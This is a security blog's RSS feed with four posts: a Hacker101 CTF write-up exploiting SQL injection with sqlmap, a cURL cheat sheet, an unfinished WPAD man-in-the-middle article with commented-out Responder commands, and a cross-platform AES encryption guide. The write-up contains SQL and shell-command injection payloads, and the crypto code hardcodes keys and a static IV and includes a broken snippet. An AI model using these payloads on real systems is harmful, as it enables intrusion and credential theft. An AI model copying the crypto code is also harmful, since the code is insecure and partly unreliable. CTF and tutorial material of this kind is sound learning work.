<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Mon, 04 Jan 2021 17:18:52 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
<p>This is my Write Up for the "Photo Gallery" challenge of HackerOne's CTF.</p>
<p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
The missing one is called <code>Invisible</code>, so lets look into that.</p>
<pre><code>http://34.74.105.127/ad3e8c7df9/
</code></pre>
<p><img src="/hackerone/photogallery-start.png" alt="initial page" title="initial page" /></p>
<h2 id="informationgathering">Information gathering</h2>
<p>with Burp we were able to find that the server returns no content for this image.
images are loaded with a <code>GET</code> Request to the server like so:</p>
<p><code>GET /ad3e8c7df9/fetch?id=1 HTTP/1.1</code></p>
<p>this also aligns with the first tip we are provided:</p>
<blockquote>
  <p>Hint 1: <em>Consider how you might build this system yourself. What would the <strong>query for fetch</strong> look like?</em></p>
</blockquote>
<p>naturally we start fuzzing the <code>id</code> parameter.</p>
<pre><code class="python language-python">GET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404
GET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404
GET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500
</code></pre>
<p>alright, no quick wins, so let's give it a try with fizzing using sqlmap.
Quickly we are able to see that the server seems to be vulnerable to some attack.</p>
<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2"
</code></pre>
<p>This command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.
when we are done we should know what to do next.</p>
<h2 id="gathereddata">Gathered Data</h2>
<h3 id="sqlmapidentifiedthefollowinginjectionpointswithatotalof311httpsrequests">sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:</h3>
<pre><code class="python language-python">Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: id=2 AND 3567=3567

Type: time-based blind
Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)
</code></pre>
<pre><code class="python language-python">[21:44:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
</code></pre>
<h3 id="ourtargetserver">Our Target Server:</h3>
<pre><code>| Type      | Service      | Version                  | Vulnerable?    |
| --------- | ------------ | ------------------------ | -------------- |
| OS        | Linux Ubuntu | ??                       | not focused    |
| Webserver | Nginx        | 1.14.0                   | no             |
| Database  | MySQL        | &gt;= 5.0.12 (MariaDB fork) | yes (id param) |
</code></pre>
<p>Good, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.</p>
<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2" -f --os=linux --dbms=mysql --level=3 -o
</code></pre>
<p>we dont really get any more useful information from here.
soo.. were kinda stuck lets just get another hint then:</p>
<blockquote>
  <p>Hint 2: <em>Take a few minutes to consider the <strong>state of the union</strong></em></p>
</blockquote>
<p>The state uf the union? are they hinting on using UNION statements in the query?
<em>The UNION operator is used to combine the result-set of two or more SELECT statements.</em>
That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:</p>
<p>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'</p>
<p>but what do we look for? Lets get another hint.</p>
<blockquote>
  <p>Hint 3: <em>This application runs on the <strong>uwsgi-nginx-flask-docker</strong> image</em></p>
</blockquote>
<p>uwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.</p>
<p>https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files</p>
<blockquote>
  <p>uWSGI can be configured using several different methods.</p>
</blockquote>
<p>YAML, JSON, INI are some supported formats -&gt; ini beeing the defualt so lets try getting the 'uwsgi.ini' file?</p>
<p><img src="/hackerone/union-select-ini.png" alt="union select wiht burp repeater" title="union select wiht burp repeater" /></p>
<p>this returns us some configdata pointing to module main which is the entrypoint.</p>
<pre><code class="python language-python">[uwsgi]
module = main
callable = app
</code></pre>
<p>so lets see if we can also fethc the main.py</p>
<pre><code class="python language-python">http://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--
</code></pre>
<p>Here we get lots of infos our <strong>first FLAG</strong> and the db connection settings:</p>
<h3 id="flag0">FLAG 0:</h3>
<pre><code class="python language-python">%s
' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)
# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
</code></pre>
<p><code>return MySQLdb.connect(host="localhost", user="root", password="", db="level5")</code></p>
<p>we also see that they are using the photos table</p>
<p><code>cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))</code></p>
<p>lets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.</p>
<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=1" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2
</code></pre>
<p>This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column <code>filename</code> since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.</p>
<pre><code class="python language-python">sqlmap -u "http://35.190.155.168/c947e97f6e/fetch?id=3" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename
</code></pre>
<p>This means that swlmap will start with the filename of id=3 which is exactly what we want right now.</p>
<p><img src="/hackerone/photo-gallery-hash.png" alt="starts to query filename of id 3" title="query on the filename of id 3" />
So lets have a look at our results:</p>
<pre><code class="python language-python">Database: level5
Table: photos
[3 entries]
+------------------------------------------------------------------+
| filename |
+------------------------------------------------------------------+
| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |
| files/adorable.jpg |
| files/purrfect.jpg |
+------------------------------------------------------------------+
</code></pre>
<blockquote>
  <p>you might be getting partial values like so:
  <code>9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????</code>
  you should be able to re-run sqlmap to find the missing characters
  <code>9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</code></p>
</blockquote>
<p>decrypted: <code>\*||+ls+-a+tmp.txt</code></p>
<p>so we try this request:
<code>GET /ad3e8c7df9/fetch?id=3\*||+ls+-a+tmp.txt</code></p>
<p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p>
<p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- HTTP/1.1</code></p>
<pre><code class="bash language-bash">"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$"
"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$"
HOSTNAME=ad3e8c7df92d
SHLVL=0
</code></pre>]]></description><link>https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackerone]]></category><category><![CDATA[hacker101]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sun, 03 Jan 2021 12:20:32 GMT</pubDate></item><item><title><![CDATA[the only cURL cheat sheet]]></title><description><![CDATA[<h1 id="curlwhatisit">cURL What is it?</h1>
<p>cURL describes itself as:</p>
<blockquote>
  <p>command line tool and library for transferring data with URLs</p>
</blockquote>
<p>cURL is a multipurpose networking tool which has lots of useful usecases.</p>
<h1 id="cheatsheet">cheat sheet</h1>
<p>| <strong>Command</strong>                                                                                                  | <strong>Description</strong>                             |
| ------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |
| <code>curl http://inlanefreight.com</code>                                                                              | GET request with <code>cURL</code>                     |
| <code>curl http://inlanefreight.com -v</code>                                                                           | Verbose GET request with <code>cURL</code>             |
| <code>curl http://admin:password@inlanefreight.com/ -vvv</code>                                                         | <code>cURL</code> Basic Auth login                     |
| <code>curl -u admin:password http://inlanefreight.com/ -vvv</code>                                                      | Alternate <code>cURL</code> Basic Auth login           |
| <code>curl -u admin:password -L http://inlanefreight.com/</code>                                                        | <code>cURL</code> Basic Auth login, follow redirection |
| <code>curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'</code>                                  | <code>cURL</code> GET request with parameter           |
| <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php</code>                           | POST request with <code>cURL</code>                    |
| <code>curl -d 'username=admin&amp;password=password' -L http://inlanefreight.com/login.php -v</code>                        | Debugging with <code>cURL</code>                       |
| <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v</code> | Cookie usage with <code>cURL</code>                    |
| <code>curl -d 'username=admin&amp;password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php</code>  | <code>cURL</code> with cookie file                     |
| <code>curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'</code>            | <code>cURL</code> specify content type                 |
| <code>curl -X OPTIONS http://inlanefreight.com/ -vv</code>                                                              | <code>cURL</code> OPTIONS request                      |
| <code>curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv</code>                                             | File upload with <code>cURL</code>                     |
| <code>curl -X DELETE http://inlanefreight.com/test.txt -vv</code>                                                       | DELETE method with <code>cURL</code>                   |</p>]]></description><link>https://dev.lwlx.xyz/blog/blog/CTFWRITEUP</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/CTFWRITEUP</guid><category><![CDATA[cheatsheet]]></category><category><![CDATA[commandline]]></category><category><![CDATA[curl]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sat, 02 Jan 2021 19:40:32 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
<h1 id="whatiswpad">What is WPAD?</h1>
<p>Sometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.</p>
<p>PAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.</p>
<h2 id="wpadalwaysfollowsthisschema">WPAD always follows this schema:</h2>
<ol>
<li>Determine if the system should use WPAD, either by looking at browser settings or asking the host OS if the browser is set to match the OS setting.</li>
<li>Ensure a network connection is available.</li>
<li>If WPAD is to be used, issue a DHCPINFORM query to ask for the URL of the PAC script.</li>
<li>If the DHCPINFORM query fails and does not return a URL, perform a DNS lookup for the hostname <code>wpad</code>.</li>
<li>If the DNS lookup succeeds, then the PAC URL is <code>http://wpad/wpad.dat</code>.</li>
<li>Establish an HTTP(S) connection to the discovered URL's server, thus downloading the PAC script.</li>
<li>If the PAC script has downloaded successfully, parse it, and optionally compile it.</li>
<li>For each network request, call the <code>FindProxyForURL()</code> function in the PAC script and use the proxy settings returned from this function.</li>
</ol>
<blockquote>
  <p>WPAD is practically asking the network "Hey there! would you like to send me a <strong>payload</strong> i can <strong>execute</strong>?"</p>
</blockquote>
<p>You can clearly see how a bad actor can abuse this.</p>
<p>Windows is certainly not the only piece of software that implements WPAD. Other operating systems (OS X, Linux) and applications do as well. For example, Google Chrome also has a WPAD implementation, but in Chrome's case, the JavaScript code from the PAC is evaluated inside of a sandbox. Other operating systems that support WPAD don't enable it by default anymore. That is why Windows is currently the most attractive target for this sort of attack.</p>
<h2 id="exploitbasis">Exploit basis</h2>
<p>When a device has these protocols enabled, if the local network DNS cannot resolve the name, the machine will ask the whole network to get a host. So, any host of the network, who knows its IP, can reply. Even if a host replies with incorrect information, it will still be regarded as a legitimate response.</p>
<h1 id="exploitablescenario">Exploitable scenario</h1>
<ol>
<li>victim and host are in the same network</li>
<li>The victim opens the browser, which is configured with the option <code>automatically detect settings</code> in <code>Local Area Network (LAN) Settings</code>.</li>
<li>The name resolution, which is performed with the steps we mentioned earlier, will be questioned on the victim's computer first.</li>
<li>In step 3, because the DNS Server does not have a corresponding record, the system's name is sent as LLMNR or NetBIOS-NS query.</li>
<li>The attacker listens to network traffic, catches name resolution query. It tells to the victim that he has the wpad.dat the victim is look for.</li>
</ol>
<p>According to the flow above, if an attacker wants to make sure that the attack will be successful, he must perform the following attacks:</p>
<ul>
<li>DHCP poisoning attack</li>
<li>DNS poisoning attack</li>
<li>WPAD poisoning attack</li>
</ul>
<!--
# proof of concept

## install Responder

## configure config

## start analyzing first

using the `-A` option enables analyze only mode
**macOS:**
<pre><code class="shell language-shell">./Responder.py -i &lt;your ip address&gt; -A
</code></pre>

**Linux:**
<pre><code class="shell language-shell">./Responder.py -I &lt;your net interface&gt; -A
</code></pre>

## create payload adn custom FindProxyForURL()

## run the attack:

- `-w`: starts WPAD service
- `-f`: fingerprints victims
- `-v`: verbose output
- `-F`: force auth to WPAD service
<pre><code class="shell language-shell"> ./Responder.py -i 192.168.1.215 -w -f -v -F
</code></pre>

force basic auth to try and gain user & pass

- `-b`: force Basic HTTP authentication
<pre><code class="shell language-shell"> ./Responder.py -i 192.168.1.215 -w -f -v -b -F
</code></pre>
-->
<p><img src="/wpad-responder-exploit/responder-intercepted.png" alt="Succsessfull WPAD attack" title="Succsessfull WPAD attack, planting a reverse shell on the victim." /></p>
<h1 id="mitigation">Mitigation</h1>
<ul>
<li>Create a DNS entry called "WPAD" that points to the real proxy server.</li>
<li>Disabling automatic proxy discovery in browsers and operating systems.</li>
<li>Configure firewalls and proxies to block and log outbound requests for wpad.dat files.</li>
</ul>
<blockquote>
  <h2 id="wipthisarticleisaworkinprogressandwillbeupdatedwithaproofofconceptsoon"><code>[WIP]</code> This article is a work in progress and will be updated with a proof of concept soon.</h2>
</blockquote>
<!--
## Read more about this topic:

[https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html](https://googleprojectzero.blogspot.com/2017/12/apacolypse-now-exploiting-windows-10-in_18.html)
-->]]></description><link>https://dev.lwlx.xyz/blog/blog/abuse-WPAD-protocol-to-MitM-any-network</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/abuse-WPAD-protocol-to-MitM-any-network</guid><category><![CDATA[MitM]]></category><category><![CDATA[WPAD]]></category><category><![CDATA[aPAColypse]]></category><category><![CDATA[PAC]]></category><category><![CDATA[exploit]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Wed, 18 Nov 2020 12:20:28 GMT</pubDate></item><item><title><![CDATA[Getting consistent Encryption in Node / PHP / Browser and openSSL]]></title><description><![CDATA[<p>I recently was tasked to find a solution for encrypting data in different places and to being able to decrypt them all in a browser during runtime.</p>
<p>Surprisingly, it was much more challenging than expected since there was so little documentation around this online. What was available were a few code-only examples, so I was forced to do R &amp; D and try all implementations and compare the in- &amp; outputs.</p>
<p>Given the lack of a decent out-of-the-box solution, I worry that many developers are settling for easy to use, insecure solutions that limit your project’s security and flexibility. Security should be easy to use and accessible.</p>
<blockquote>
  <p>Clone the repo here to get started with this setup: <a href="https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a">https://gist.github.com/Lawlez/88e04e3541cc0608c953a118b86bfc1a</a></p>
</blockquote>
<p>Okay, so lets assume we use following input data to test each implementation:</p>
<ul>
<li><strong><code>key</code></strong> = '5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9' <code>//must be 256 bits</code></li>
<li><strong><code>iv</code></strong> = '1d6ef201e0e7a9019ddf8414034325e2' <code>//must be 128 bits</code></li>
<li><strong><code>inputData</code></strong> = <code>{"TestData":"w17h Spé^cIäl chàær§¢tèrs", "OK":"://seems/fine?x=lol"}</code></li>
</ul>
<p>Let's quickly run through and test each implementation:</p>
<h2 id="usingnodejscryptomodule">Using Node JS Crypto module</h2>
<p>Node Provides a nice <code>crypto</code> implementation. It's documentation is rather sparse, but this is what most resources suggest by using:</p>
<ul>
<li><code>crypto.randomBytes()</code></li>
<li><code>crypto.createCipheriv()</code></li>
<li><code>crypto.createDecipheriv()</code></li>
</ul>
<pre><code class="javascript language-javascript">const crypto = require('crypto')

/**********************************************************************
*
*        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *
*
***********************************************************************/

const encryption = (data = 'TestString {} Héllöüä') =&gt; {

   const secretPhrase = crypto.randomBytes(16).toString('hex')
   const salt = crypto.randomBytes(128 / 8).toString('hex')
   //here we generate the key and give it back as a string, we use 100k iterations
   //as suggested in best practices
   //We can use the key multiple times to encrypt multiple things(-30GB), we just cant use
   //the same initialization vector twice
   //the key for aes-256 needs to be 256 bits which equals 32 bytes or 32 characters
   const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256').toString('hex').substr(0, 32)
   //create unique IV for each encryption, the key can be reused. IV needs to always be 16 bytes
   const IV = crypto.randomBytes(16)

   //create ciphers for each encryption using the shared key and the unuique IV
   const projectConfigCipher = crypto.createCipheriv('aes-256-cbc', configKey, IV.toString('hex').substr(0,16)

   //encripting the storage location using the prepared cipher
   const encrypted = Buffer.concat([configStorageCipher.update(
       'STORAGE', 'utf8'
   ), configStorageCipher.final()]).toString('hex')

   return encrypted

}
</code></pre>
<blockquote>
  <p>this is <strong>NOT</strong> the final implementation; check below to see it.</p>
</blockquote>
<h3 id="testingtheimplementation">Testing the implementation</h3>
<p>We notice that we need to trim the key to 32bytes and the IV to 16 bytes. This is likely because of the conversion from hex to string after the creation of the key.</p>
<ul>
<li><strong><code>key</code></strong> = '5035ae3567f2e69320b083d59a7364cf' <code>//is now 32 bytes string</code></li>
<li><strong><code>iv</code></strong> = '1d6ef201e0e7a901' <code>//is now 16 bytes string</code></li>
</ul>
<p>This will probably lead to an issue later on since other implementations actually want the longer strings. Maybe we can find a workaround by base64 encoding instead of stringifying the key and iv.</p>
<p>a quick test reveals, yes, we actually can:</p>
<pre><code>const IV = crypto.randomBytes(16)

console.log(IV)
// &lt;Buffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7&gt;

console.log(IV.toString('base64'))
// wR6YhFTrhfaz0FGH0mKApw==

console.log(Buffer.from(IV.toString('base64'), 'base64'))
//&lt;Buffer c1 1e 98 84 54 eb 85 f6 b3 d0 51 87 d2 62 80 a7&gt;
</code></pre>
<p>now we could also just create a buffer again from the string to make it 16/32 bytes (ready for usage):</p>
<pre><code>Buffer.from('5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9', 'hex')
//&lt;Buffer 50 35 ae 35 67 f2 e6 93 20 b0 83 d5 9a 73 64 cf 8d 4b 14 e7 7d 7b 79 80 51 24 1c e5 46 b3 27 d9&gt;

Buffer.from('1d6ef201e0e7a9019ddf8414034325e2','hex'))
//&lt;Buffer 1d 6e f2 01 e0 e7 a9 01 9d df 84 14 03 43 25 e2&gt;
</code></pre>
<p>This seems to be a nice solution when you <strong>receive</strong> the key and iv as an input; if we generate it ourselves, however, it better to just avoid the conversion to string after generation that many people use in examples:</p>
<pre><code>// type Buffer, 16 bytes
const IV = crypto.randomBytes(16)

// type Buffer, 32 bytes
const configKey = crypto.pbkdf2Sync(secretPhrase, salt, 100000, 32, 'sha256')
</code></pre>
<p>This key and IV pair can be consumed directly by our ciphers, but we would need to convert it to a hex string first to save and forward them.</p>
<h3 id="sowhatistheoutputofthisfunction">So what is the output of this function?</h3>
<p>The output we received is of type buffer, but when we convert it to a string using <code>toString('hex')</code> we can read the data:</p>
<ul>
<li><strong><code>OUTPUT</code></strong> = '<Buffer f2 fb 62 b1 7e e9 da 0c 8c bd 56 f2 45 a9 87 60 b4 e2 a6 d0 c5 de f1 50 bc 6d 86 00 f8 5d b4 79>' <code>//is 32 bytes</code></li>
<li><strong><code>OUTPUT_Stringified</code></strong> = 'f2fb62b17ee9da0c8cbd56f245a98760b4e2a6d0c5def150bc6d8600f85db479' <code>//is now 64 bytes string</code></li>
<li><strong><code>OUTPUT_Base64</code></strong> = '8vtisX7p2gyMvVbyRamHYLTiptDF3vFQvG2GAPhdtHk=' <code>//is now 44 bytes string</code></li>
</ul>
<p>so using the codes below, we can switch between these three outputs as we like</p>
<pre><code class="javascript language-javascript">//output Buffer
encrypted = Buffer.concat([encrypted, Cipher.final()]);

//output String
encrypted = Buffer.concat([encrypted, Cipher.final()]).toString("hex");

//output Base64
encrypted = Buffer.concat([encrypted, Cipher.final()]).toString("base64");

//revert conversion to base64
Buffer.from(encrypted.toString("base64"), "base64");
</code></pre>
<p>From what we have learned here, I guess the best option is to use the base64 output method since we can easily convert it to a buffer</p>
<h2 id="usingbrowserifyaessnodecryptolikeimplementationinsidethebrowser">Using browserify-aes's node crypto-like implementation inside the Browser</h2>
<p>Inside the browser, we cannot use Nodes.js built-in modules. Using <code>browserify-aes</code> we can use a node-like crypto implementation, which uses the same syntax as the node implementation. In my use case, I only need to decipher in the browser, this means I don’t have to worry about a truly random key generation or ciphering.</p>
<pre><code class="js language-js">import crypto from "browserify-aes";

/**********************************************************************
 *
 *        DECRYPTION MODULE FOR USE IN BROWSER DURING RUNTIME          *
 *
 ***********************************************************************/
const decrypt = (Base64Hash) =&gt; {
  //we use the base64 hash generated by openssl cli as an input
  const Base64Hash =
    "Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg=";
  const Key =
    "5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9";
  const IV = "1d6ef201e0e7a9019ddf8414034325e2";
  const hexToBin = (hex) =&gt; {
    //converts hex strings to binary arr
    for (var bytes = [], c = 0; c &lt; hex.length; c += 2) {
      bytes.push(parseInt(hex.substr(c, 2), 16));
    }
    return bytes;
  };
  //ein neuer cipher wird vorbereitet, mittels aes256, unserem 256 bit KEY und dem config IV
  const decipher = crypto.createDecipheriv(
    "aes256",
    hexToBin(Key),
    hexToBin(IV)
  );

  //der hash wird nun decrypted mittels dem zuvor erstellten cipher
  const decrypted = Buffer.concat([
    decipher.update(Buffer.from(Base64Hash, "base64")),
    decipher.final(),
  ]).toString("utf8");

  return JSON.parse(decrypted);
};
</code></pre>
<ul>
<li><strong><code>OUTPUT</code></strong> = {TestData: "w17h Spé^cIäl chàær§¢tèrs", OK: "://seems/fine?x=lol"} <code>//yes, thats our original input! :D</code></li>
</ul>
<h2 id="encryptiondecryptionmoduleforphp7usingopenssl">ENCRYPTION &amp; DECRYPTION MODULE FOR PHP7+ USING OPENSSL</h2>
<p>In PHP 7 we make use of the <code>openssl_encrypt</code> implementation to encrypt an utf8 string and finally encode it with <code>base64_encode</code>.
For decryption we also make use of the official openssl implementation <code>openssl_decrypt</code>, before decrypting we need to decode using <code>base64_decode</code>.</p>
<pre><code class="php language-php">/**********************************************************************
*
*        ENCRYPTION &amp; DECRYPTION MODULE FOR PHP7+ USING OPENSSL       *
*
***********************************************************************/

class AESEncryption {

   //key length should be 256 bits for aes 256 this means we use a string with 32 bytes
   public static $key = "5f08e0ec585393a8e2ca8f0a1a0ae752";

    //iv length should be always be 128 bit / 16 bytes
   public static $iv = "05d387e7f773035a";

    // The AES uses a block size of sixteen octets (128 bits)
   public static $Method = 'AES-256-CBC';

   /**
     * use the AES to encrypt plaintext data and return a base 64 string
    *
    * $key
    */
   public static function encrypt($cleartext,$key = ''){

       $key = empty($key) ? self::$key : $key;

       $encrypted = openssl_encrypt($cleartext, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);

       return base64_encode($encrypted);

   }

   /**
     * use the AES to decrypt a base 64 string into plaintext
    *
    * $key
    */
   public static function decrypt($encrypted,$key = ''){

       $key = empty($key) ? self::$key : $key;

       $encrypted = base64_decode($encrypted);

       $decrypted = openssl_decrypt($encrypted, self::$Method, $key, OPENSSL_RAW_DATA, self::$iv);

       return trim($decrypted);
   }
}
</code></pre>
<blockquote>
  <p>while desperately searching for a solution I looked into doing the encryption in PHP instead of openssl, since I scrapped this idea I cannot explain any further. I still keep this PHP 7 example here because its hard to find examples online that don’t use mcrypt.</p>
</blockquote>
<h2 id="usingopensslforuseincli">Using OpenSSL for use in CLI</h2>
<p>Inside of a Command Line Interface, we use <code>openssl</code> do en- or decrypt data.</p>
<p>For node/browserify to be able to decrypt it we need to add the <code>-nosalt</code> option, which disables salting the data.</p>
<pre><code class="bash language-bash">#########################################################################################
#                                                                                       #
#               ENCRYPTION FOR CLI IN / MACOS / LINUX / WINDOWS                         #
#                                                                                       #
#########################################################################################

#encrypt with key &amp; IV but no salt
cat config.json | openssl aes-256-cbc -iv $(cat iv)  -K $(cat key) -A -nosalt -base64

#decrypt with key IV and base64
echo "encryptedString" | openssl aes-256-cbc -d -iv $(cat iv)  -K $(cat key) -base64 -A
</code></pre>
<h3 id="testingtheimplementation-1">testing the implementation</h3>
<p>I created a json file called <code>test.json</code> containing the inputData. so when we run the following command …</p>
<pre><code class="bash language-bash">cat test.json | openssl aes-256-cbc -iv "1d6ef201e0e7a9019ddf8414034325e2"  -K "5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9" -A -nosalt
</code></pre>
<p>We get no warnings and an output like this:</p>
<ul>
<li><strong><code>OUTPUT</code></strong> = g??.G?٪a?W????ԝFv?? 0P0+v?'???R=CR??a? ?5!??N?"?e?q?M{C\??:u-?wH?? <code>//weird looking binary data</code></li>
</ul>
<p>as you can see this is not very usefull so we apply the base64 encoding after encryption</p>
<pre><code class="bash language-bash">cat test.json | openssl aes-256-cbc -iv "1d6ef201e0e7a9019ddf8414034325e2"  -K "5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9" -A -nosalt -base64
</code></pre>
<ul>
<li><strong><code>OUTPUT_base64</code></strong> = Z8QIo6YuR7DZqmHHV4WqqorUnUZ2n88gMFADMCt2FKUn/ZeYUj1DEBNS2NthignUNR0hw+OOFU7qACKPZbxx8k0Pe0McXNDrOnUtl3dIwdg= <code>//now this looks nice</code></li>
</ul>
<p>now we can also decrypt the just created data like so</p>
<pre><code class="bash language-bash">echo $encryptedData | openssl aes-256-cbc -d -iv "1d6ef201e0e7a9019ddf8414034325e2" -K "5035ae3567f2e69320b083d59a7364cf8d4b14e77d7b798051241ce546b327d9" -A -base64
</code></pre>
<p>This yields us this output</p>
<ul>
<li><strong><code>OUTPUT</code></strong> = {"TestData":"w17h Spé^cIäl chàær§¢tèrs", "OK":"://seems/fine?x=lol"} <code>//yes, thats our original input! :)</code></li>
</ul>
<h1 id="finalsolution">final solution</h1>
<h2 id="usingnodejsduringinitialbuild">Using NodeJS during initial build</h2>
<p>While building our app this code is responsible for:</p>
<ul>
<li>creating a unique <code>key</code> on every build</li>
<li>creating a unique <code>iv</code> for every object to be encrypted</li>
<li>outputting an encrypted base64 encoded string of data</li>
</ul>
<p>the output needs to be consumed by either:</p>
<ul>
<li>the application during runtime (browserify implementation)</li>
<li>openssl in case of deployment</li>
</ul>
<pre><code class="javascript language-javascript">const crypto = require("crypto");

/**********************************************************************
 *
 *        DECRYPTION MODULE FOR USE INSIDE NODE.JS                     *
 *
 ***********************************************************************/

const encryption = (
  data = { TestData: "w17h Spé^cIäl chàær§¢tèrs", OK: "://seems/fine?x=lol" }
) =&gt; {
  const secretPhrase = crypto.randomBytes(16).toString("hex");
